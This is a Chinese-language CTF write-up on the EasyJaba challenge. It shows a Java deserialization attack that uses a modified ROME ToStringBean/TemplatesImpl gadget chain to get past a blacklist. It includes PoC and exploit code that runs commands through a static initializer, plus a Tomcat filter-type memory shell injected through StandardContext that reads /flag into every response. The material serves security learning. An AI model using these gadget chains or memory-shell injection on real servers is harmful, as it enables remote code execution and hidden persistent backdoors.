# 从一道题看java反序列化和回显获取

阅读量 **222108**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-11-23 16:30:59

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t010eb6574ff798ee34.jpg)

## 0x00 前言

EasyJaba 这个题目是陇原战”疫”2021网络安全大赛的一道题，最近正好在学习java反序列化和内存马的相关知识，通过这个题目可以很好的进行实践。

## 0x01 反序列化

题目给了jar包，直接用jd-gui反编译看看

![](https://md.buptmerak.cn/uploads/upload_bacde8e6af23c6a02f7a55c23644fc9c.png)

Base64decode直接给了readObject，很明显有反序列化的考点了，不过这里还有个神秘的object1和BlacklistObjectInputStream,应该是给的一些障碍

简单看了一下应用没看到实现了Serailizable接口的类，看下lib，发现了rome

![](https://p4.ssl.qhimg.com/t01142a156925db0e02.png)

应该就是从经典的ROME 1.0 任意代码执行反序列化链子入手了

直接用idea反编译，这次代码清楚多了

简单分析下就是给ObjectInputStream加了俩黑名单

    
    
    java.util.HashMap
    javax.management.BadAttributeValueExpException
    

再看ROME的反序列化链条

    
    
    TemplatesImpl.getOutputProperties()
    NativeMethodAccessorImpl.invoke0(Method, Object, Object[])
    NativeMethodAccessorImpl.invoke(Object, Object[])
    DelegatingMethodAccessorImpl.invoke(Object, Object[])
    Method.invoke(Object, Object...)
    ToStringBean.toString(String)
    ToStringBean.toString()
    ObjectBean.toString()
    EqualsBean.beanHashCode()
    ObjectBean.hashCode()
    ​
    HashMap<K,V>.hash(Object)
    HashMap<K,V>.readObject(ObjectInputStream)
    

入口点就是从HashMap开始的，显然不能直接使用了

![](https://p3.ssl.qhimg.com/t0152cd92cca18b7504.png)

但是注意到代码直接给了toString

![](https://p4.ssl.qhimg.com/t01d1701d9b3d1138de.png)

所以我们只需要把链子稍微改下就能用了,新的链子

    
    
    TemplatesImpl.getOutputProperties()
    NativeMethodAccessorImpl.invoke0(Method, Object, Object[])
    NativeMethodAccessorImpl.invoke(Object, Object[])
    DelegatingMethodAccessorImpl.invoke(Object, Object[])
    Method.invoke(Object, Object...)
    
    ToStringBean.toString(String)
    ToStringBean.toString()
    

其实主要是利用了ROME的ToStringBean触发`可控.invoke(可控,NO_PARAMS)`然后利用TemplatesImpl这个类来实现任意代码执行

**如何利用可控.invoke(可控,NO_PARAMS)实现任意代码执行**

这其实是很多java反序列化导致任意代码执行的最后一环

这里我们利用的是TemplatesImpl.getOutputProperties()

简单写个Poc下断点跟下流程

    
    
    import com.sun.org.apache.xalan.internal.xsltc.DOM;
    import com.sun.org.apache.xalan.internal.xsltc.TransletException;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Method;
    
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
    import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
    import javassist.ClassPool;
    import javassist.CtClass;
    import java.util.Properties;
    
    public class Poc {
        public static class Evil extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet{
            static {
                //shell code here
                System.out.println("Hello Java");
            }
            @Override
            public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    
            }
    
            @Override
            public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    
            }
        }
        public static void main(String[] args) throws Exception{
            ClassPool pool = ClassPool.getDefault();
            CtClass clazz = pool.get(Evil.class.getName());
            byte[][] bytecodes = new byte[][]{clazz.toBytecode()};
    
    
            Class templatesimpl = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
            Class[] types = {byte[][].class, String.class, Properties.class, int.class, TransformerFactoryImpl.class};
            Constructor constructor = templatesimpl.getDeclaredConstructor(types);
            constructor.setAccessible(true);
            TransformerFactoryImpl tf = new TransformerFactoryImpl();
            Properties p = new Properties();
            Object[] params = {bytecodes,"whatever",p,1,tf};
    
            Object object = constructor.newInstance(params);
            Method method = templatesimpl.getMethod("getOutputProperties");
            method.invoke(object,null);
        }
    }
    

首先进入

![](https://p2.ssl.qhimg.com/t01392c154857f606d6.png)

因为我们之前反射调用templatesImple的构造函数构造了一个对象

    
    
    Object[] params = {bytecodes,"whatever",p,1,tf};
    Object object = constructor.newInstance(params);
    

此时该templatesImpl的_bytecodes就是我们注入的恶意类字节码

![](https://p0.ssl.qhimg.com/t012ef95ec25fb7a0f5.png)

下一步跳转到newTransformer

![](https://p0.ssl.qhimg.com/t0109082b08efaf187f.png)

然后跳转到getTransletInstance

![](https://p0.ssl.qhimg.com/t011eae93c3214010b5.png)

因为我们的templatesImple _class属性为null,会进入defineTransletClasses();

![](https://p0.ssl.qhimg.com/t01cb7c74f67a89a27f.png)

这个方法大致意思就是将我们的字节码，通过Classloader defineClass转成Class并存储在templatesImple的_class属性中

此处还会对class的父类进行检查如果是`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`，则将`_transletIndex`指向该位置

![](https://p4.ssl.qhimg.com/t0125bb7449dafef46d.png)

回到getTransletInstance,可以发现此时会实力话我们注入的恶意类，同时会强制类型转换成AbstractTranslet类型，这两处也是为什么我们需要将我们的恶意类继承`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`,不然无法触发此处构造函数

![](https://p1.ssl.qhimg.com/t01fccb8115d15015fa.png)

然后就能执行我们恶意类Evil里static代码块了。

言归正传，对于本题我们构造如下exp，这里也可以通过javassist手动加上父类

    
    
    ClassPool pool = ClassPool.getDefault();
    CtClass clazz = pool.get(E.class.getName());
    clazz.setSuperclass(pool.get(Class.forName("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet").getName()));
    byte[][] bytecodes = new byte[][]{clazz.toBytecode()};
    
    TemplatesImpl templatesimpl = new TemplatesImpl();
    Field fieldByteCodes = templatesimpl.getClass().getDeclaredField("_bytecodes");
    fieldByteCodes.setAccessible(true);
    fieldByteCodes.set(templatesimpl, bytecodes);
    Field fieldName = templatesimpl.getClass().getDeclaredField("_name");
    fieldName.setAccessible(true);
    fieldName.set(templatesimpl, "test");
    
    Field fieldTfactory = templatesimpl.getClass().getDeclaredField("_tfactory");
    fieldTfactory.setAccessible(true);
    fieldTfactory.set(templatesimpl, Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl").newInstance());
    
    ObjectBean objectBean = new ObjectBean(Templates.class, templatesimpl);
    

其中E为我们构造的恶意类用来执行代码比如

    
    
        public static class E{
            static  {
                try {
                    java.lang.Runtime.getRuntime().exec("calc.exe");
                }catch (Throwable t){}
            }
        }
    

将生成的payload打过去以后可以发现弹出了计算器

![](https://p0.ssl.qhimg.com/t01169192125df5523c.png)

## 0x02 获得回显

在可以命令执行后尝试了各种方法，但是发现拿不到命令执行的结果，后来发现有题目提示不出网…

不出网意味着类似反弹shell,curl，dnslog之类外带回显方式不可用了。加上并没有给静态文件的目录，将回显写入静态文件的方式也不好操作。这里利用内存马的思想，动态注入一个filter来获得回显。但是还有一个坑点在于由于我们的data是在url里注入的，如果太长的话会爆Request
too Large的错误。所以我们要尽量缩短生成的类字节码大小。最终构造的恶意类如下。

    
    
    public static class E{
        static {
            try {
                //这里采取Litch1师傅文章的思路，通过WebappClassLoader拿到StandardContext
                Class WebappClassLoaderBaseClz = Class.forName("org.apache.catalina.loader.WebappClassLoaderBase");
                Object webappClassLoaderBase = Thread.currentThread().getContextClassLoader();
                Field WebappClassLoaderBaseResource = WebappClassLoaderBaseClz.getDeclaredField("resources");
                WebappClassLoaderBaseResource.setAccessible(true);
                Object resources = WebappClassLoaderBaseResource.get(webappClassLoaderBase);
                Class WebResourceRoot = Class.forName("org.apache.catalina.WebResourceRoot");
                Method getContext = WebResourceRoot.getDeclaredMethod("getContext", null);
    
                //拿到StandardContext后就可以通过addFilterMap方法注入filter型内存马了
                StandardContext standardContext = (StandardContext) getContext.invoke(resources, null);
    
    Filter filter = (servletRequest, servletResponse, filterChain) -> {
    
    
                            FileInputStream fis = new FileInputStream("/flag");
                            byte[] buffer = new byte[16];
                            StringBuilder res = new StringBuilder();
                            while (fis.read(buffer) != -1) {
                                res.append(new String(buffer));
                                buffer = new byte[16];
                            }
                            fis.close();
    
                            servletResponse.getWriter().write(res.toString());
                            servletResponse.getWriter().flush();
    
                        };
                FilterDef filterDef = new FilterDef();
                filterDef.setFilterName("A");
                filterDef.setFilterClass(filter.getClass().getName());
                filterDef.setFilter(filter);
                standardContext.addFilterDef(filterDef);
                FilterMap filterMap = new FilterMap();
                filterMap.setFilterName("A");
                filterMap.addURLPattern("/*");
                standardContext.addFilterMap(filterMap);
                standardContext.filterStart();
    
                //本地测试时取消下面这行可以帮助观察是否注入成功
                //System.out.println("injected");
            }catch (Throwable t){
                //t.printStackTrace();
            }
        }
    }
    

然后实际测试的时候发现自己带命令执行的生成的字节码都太长了，于是索性只读取”/flag”试试。

第一次访问

![](https://p4.ssl.qhimg.com/t01c6291f8cc87227cc.png)

第二次访问，成功拿到flag

![](https://p2.ssl.qhimg.com/t01d8777bf0dd629cc8.png)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Eki** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/258575](/post/id/258575)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Web安全](/tag/Web安全)
  * [Java](/tag/Java)

 **+1** __6赞

 __收藏

![](https://p0.ssl.qhimg.com/t012521b8c9e29a374e.png) Eki

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

